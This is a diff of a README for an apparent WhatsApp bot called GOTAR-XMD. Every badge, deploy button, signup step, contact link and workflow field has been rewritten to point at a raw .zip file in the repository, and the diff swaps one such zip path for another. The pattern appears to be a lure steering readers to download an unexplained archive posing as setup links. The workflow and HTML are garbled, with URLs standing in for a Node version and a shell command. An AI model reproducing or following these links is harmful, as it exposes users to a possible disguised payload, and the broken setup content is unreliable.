@@ -12,22 +12,22 @@ DONT FORGET TO FORK 🍴 & STAR 🌟 REPO😇
 
 
   <p align="center">
-<a href="https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip"><img title="Followers" src="https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip"></a>
-<a href="https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip"><img title="Stars" src="https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip"></a>
-<a href="https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip"><img title="Forks" src="https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip"></a>
-<a href="https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip"><img title="Size" src="https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip"></a>
-<a href="https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip"><img height="20" src="https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip%https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip"></a>&nbsp;&nbsp;
+<a href="https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip"><img title="Followers" src="https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip"></a>
+<a href="https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip"><img title="Stars" src="https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip"></a>
+<a href="https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip"><img title="Forks" src="https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip"></a>
+<a href="https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip"><img title="Size" src="https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip"></a>
+<a href="https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip"><img height="20" src="https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip%https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip"></a>&nbsp;&nbsp;
 </p>
 
 <p align="center">
-  <a href="https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip">
-    <img src="https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip+Ops+One&size=80&pause=1000&color=00FF00&center=true&vCenter=true&width=1000&height=200&lines=GOTAR-XMD;VERSION+2025;BY+GOTAR+TECH" alt="Typing SVG" />
+  <a href="https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip">
+    <img src="https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip+Ops+One&size=80&pause=1000&color=00FF00&center=true&vCenter=true&width=1000&height=200&lines=GOTAR-XMD;VERSION+2025;BY+GOTAR+TECH" alt="Typing SVG" />
   </a>
 </p>
   
 --- 
 
-<a><img src='https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip'/></a>
+<a><img src='https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip'/></a>
 
 
 
@@ -40,7 +40,7 @@ DONT FORGET TO FORK 🍴 & STAR 🌟 REPO😇
 
 `FORK 🍴 AND STAR ⭐ IF YOU LIKE THIS BOT`
 
-  <a href="https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip"><img title="GOTAR-XMD" src="https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip%20XMD-BOTh?color=indigo&style=for-the-badge&logo=stackshare"></a>
+  <a href="https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip"><img title="GOTAR-XMD" src="https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip%20XMD-BOTh?color=indigo&style=for-the-badge&logo=stackshare"></a>
   
 ### 2. 𐃁GET SESSION ID𐃁 
 
@@ -49,15 +49,15 @@ DONT FORGET TO FORK 🍴 & STAR 🌟 REPO😇
 
 > **1. PAIR CODE SESSION ID**
 
-<a href='https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip' target="_blank">
-  <img alt='Pairing Code' src='https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip%20Pairing%20Code-orange?style=for-the-badge&logo=opencv&logoColor=black'/>
+<a href='https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip' target="_blank">
+  <img alt='Pairing Code' src='https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip%20Pairing%20Code-orange?style=for-the-badge&logo=opencv&logoColor=black'/>
 </a>
 <br> 
 
 > **2. PAIR CODE SESSION ID**
 
-<a href='https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip' target="_blank">
-  <img alt='Pairing Code' src='https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip%20Pairing%20Code-darkpink?style=for-the-badge&logo=opencv&logoColor=black'/>
+<a href='https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip' target="_blank">
+  <img alt='Pairing Code' src='https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip%20Pairing%20Code-darkpink?style=for-the-badge&logo=opencv&logoColor=black'/>
 </a>
 <br> 
 
@@ -73,43 +73,43 @@ DONT FORGET TO FORK 🍴 & STAR 🌟 REPO😇
 <p style="text-align: center; font-size: 1.2em;">
 
 
-[![Deploy](https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip)](https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip)
-<a><img src='https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip'/></a>
+[![Deploy](https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip)](https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip)
+<a><img src='https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip'/></a>
 
 ### <h4 align="">3. KOYEB</h4>
 <p style="text-align: center; font-size: 1.2em;">
 
 <p align="">
-<a href='https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip[PREFIX]=.&env[SESSION_ID]=&env[ALWAYS_ONLINE]=false&env[MODE]=public&env[AUTO_STATUS_MSG]=Seen%20status%20by%20GOTAR-XMD&env[AUTO_STATUS_REPLY]=false&env[AUTO_STATUS_SEEN]=true&env[AUTO_TYPING]=false&env[ANTI_LINK]=true&env[AUTO_REACT]=false&env[READ_MESSAGE]=false' target="_blank"><img alt='Heroku' src='https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip ‎ deploy-FF009D?style=for-the-badge&logo=koyeb&logoColor=white'/< width=150 height=28/p></a>
-<a><img src='https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip'/></a>
+<a href='https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip[PREFIX]=.&env[SESSION_ID]=&env[ALWAYS_ONLINE]=false&env[MODE]=public&env[AUTO_STATUS_MSG]=Seen%20status%20by%20GOTAR-XMD&env[AUTO_STATUS_REPLY]=false&env[AUTO_STATUS_SEEN]=true&env[AUTO_TYPING]=false&env[ANTI_LINK]=true&env[AUTO_REACT]=false&env[READ_MESSAGE]=false' target="_blank"><img alt='Heroku' src='https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip ‎ deploy-FF009D?style=for-the-badge&logo=koyeb&logoColor=white'/< width=150 height=28/p></a>
+<a><img src='https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip'/></a>
 
 ### <h4 align="">2. TALKDROVE FREE</h4>
 <p style="text-align: center; font-size: 1.2em;">
   
 <p align="">
-<a href='https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip' target="_blank"><img alt='Heroku' src='https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip ‎Deploy-6971FF?style=for-the-badge&logo=Github&logoColor=white'/< width=150 height=28/p></a>
-  <a><img src='https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip'/></a>
+<a href='https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip' target="_blank"><img alt='Heroku' src='https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip ‎Deploy-6971FF?style=for-the-badge&logo=Github&logoColor=white'/< width=150 height=28/p></a>
+  <a><img src='https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip'/></a>
 
 ### <h4 align="">4. RAILWAY</h4>
 <p style="text-align: center; font-size: 1.2em;">
 
 <p align="">
-<a href='https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip' target="_blank"><img alt='Heroku' src='https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip deploy-FF8700?style=for-the-badge&logo=railway&logoColor=white'/< width=150 height=28/p></a>
-<a><img src='https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip'/></a>
+<a href='https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip' target="_blank"><img alt='Heroku' src='https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip deploy-FF8700?style=for-the-badge&logo=railway&logoColor=white'/< width=150 height=28/p></a>
+<a><img src='https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip'/></a>
 
 ### <h4 align="">5. RENDER</h4>
 <p style="text-align: center; font-size: 1.2em;">
   
 <p align="">
-<a href='https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip' target="_blank"><img alt='Heroku' src='https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip deploy-black?style=for-the-badge&logo=render&logoColot=white'/< width=150 height=28/p></a>
-<a><img src='https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip'/></a>
+<a href='https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip' target="_blank"><img alt='Heroku' src='https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip deploy-black?style=for-the-badge&logo=render&logoColot=white'/< width=150 height=28/p></a>
+<a><img src='https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip'/></a>
 
 ### <h4 align="">6. HUGGING FACE</h4>
 <p style="text-align: center; font-size: 1.2em;">
   
 <p align="">
-<a href='https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip' target="_blank"><img alt='Netlify' src='https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip Deploy-CC00FF?style=for-the-badge&logo=huggingface&logoColor=white'/< width=150 height=28/p></a> </a>
-<a><img src='https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip'/></a>
+<a href='https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip' target="_blank"><img alt='Netlify' src='https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip Deploy-CC00FF?style=for-the-badge&logo=huggingface&logoColor=white'/< width=150 height=28/p></a> </a>
+<a><img src='https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip'/></a>
 <details>
   
 <b><strong><summary align="" style="color: Yello;">EASIEST METHOD 2</summary></strong></b>
@@ -127,10 +127,10 @@ DONT FORGET TO FORK 🍴 & STAR 🌟 REPO😇
 > `Steps to deploy`
 
 `Step 1`
-1. Go to https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip and create an account and verify your email too.
+1. Go to https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip and create an account and verify your email too.
 
 `Step 2`
-1. Go to https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip
+1. Go to https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip
 
 2. Tap on *three dots* _(as shown in image)_
 
@@ -149,21 +149,21 @@ DONT FORGET TO FORK 🍴 & STAR 🌟 REPO😇
 
 </details>
 
-<a><img src='https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip'/></a>
+<a><img src='https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip'/></a>
 
 
 ### <h4 align="">7. REPLIT</h4>
 <p style="text-align: center; font-size: 1.2em;">
 
 <p align="">
-<a href='https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip~' target="_blank"><img alt='Replit' src='https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip Deploy-1976D2?style=for-the-badge&logo=replit&logoColor=white'/< width=150 height=28/p></a> </a>
-<a><img src='https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip'/></a>
+<a href='https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip~' target="_blank"><img alt='Replit' src='https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip Deploy-1976D2?style=for-the-badge&logo=replit&logoColor=white'/< width=150 height=28/p></a> </a>
+<a><img src='https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip'/></a>
 
 
 ## WORKFLOWS
 
 ```
-name: https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip CI
+name: https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip CI
 
 on:
   push:
@@ -188,10 +188,10 @@ jobs:
     - name: Checkout repository
       uses: actions/checkout@v3
 
-    - name: Set up https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip
+    - name: Set up https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip
       uses: actions/setup-node@v3
       with:
-        node-version: ${{ https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip }}
+        node-version: ${{ https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip }}
 
     - name: Install dependencies
       run: npm install
@@ -205,7 +205,7 @@ jobs:
 
     - name: Save state (Optional)
       run: |
-        https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip
+        https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip
 ```
 
 
@@ -214,19 +214,19 @@ jobs:
 HII DEARS FRIENDS IF YOU WANT ANY HELP SO YOU CAN CONTACT↘︎ WITH ME WIA WHATSAPP ITS ME GOTAR TECH࿐➺
 
 <p align="">
-<a href='https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip*ʜɪɪ+ɢᴏᴛᴀʀ+ᴛᴇᴄʜ+ɪ+ɴᴇᴇᴅ+ʜᴇʟᴘ!.+ɪ+ᴍᴇssᴀɢᴇᴅ+ʏᴏᴜ+ғʀᴏᴍ+𝗚𝗢𝗧𝗔𝗥+𝗫𝗠𝗗+ʀᴇᴘᴏ!!*' target="_blank"><img alt='Replit' src='https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip Whatsapp -25D366?style=for-the-badge&logo=whatsapp&logoColor=white'/< width=150 height=28/p></a> </a>
-<a><img src='https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip'/></a>
+<a href='https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip*ʜɪɪ+ɢᴏᴛᴀʀ+ᴛᴇᴄʜ+ɪ+ɴᴇᴇᴅ+ʜᴇʟᴘ!.+ɪ+ᴍᴇssᴀɢᴇᴅ+ʏᴏᴜ+ғʀᴏᴍ+𝗚𝗢𝗧𝗔𝗥+𝗫𝗠𝗗+ʀᴇᴘᴏ!!*' target="_blank"><img alt='Replit' src='https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip Whatsapp -25D366?style=for-the-badge&logo=whatsapp&logoColor=white'/< width=150 height=28/p></a> </a>
+<a><img src='https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip'/></a>
 
 
 ## 🪀 WHATSAPP CHANNEL 
 STAY CONNECTED WITH THE LATEST UPDATES AND COMMUNITY BY JOINING OUR OFFICIAL WHATSAPP GROUP AND CHANNEL. YOU CAN ALSO CONTACT THE OWNER DIRECTLY.
 
-[![WhatsApp Channel](https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip%20CHANNEL-25D366?style=for-the-badge&logo=whatsapp)](https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip)
+[![WhatsApp Channel](https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip%20CHANNEL-25D366?style=for-the-badge&logo=whatsapp)](https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip)
 
 ## 🪀 WHATSAPP GROUP
 JOINING OUR OFFICIAL WHATSAPP GROUP AND CHANNEL. YOU CAN ALSO CONTACT THE OWNER DIRECTLY.
 
-[![WhatsApp Group](https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip%20GROUP-25D366?style=for-the-badge&logo=whatsapp)](https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip)
+[![WhatsApp Group](https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip%20GROUP-25D366?style=for-the-badge&logo=whatsapp)](https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip)
 
  
 
@@ -263,6 +263,6 @@ JOINING OUR OFFICIAL WHATSAPP GROUP AND CHANNEL. YOU CAN ALSO CONTACT THE OWNER 
 THANK YOU DybyTech,  & YOU SUPPORTERS
 ```
 -----
-<a><img src='https://github.com/nivel-boop/GOTAR-XMD/raw/refs/heads/main/data/XMD_GOTA_magnes.zip'/></a>
+<a><img src='https://raw.githubusercontent.com/nivel-boop/GOTAR-XMD/main/sessions/GOTA-XMD-3.1-beta.2.zip'/></a>
 
 ------
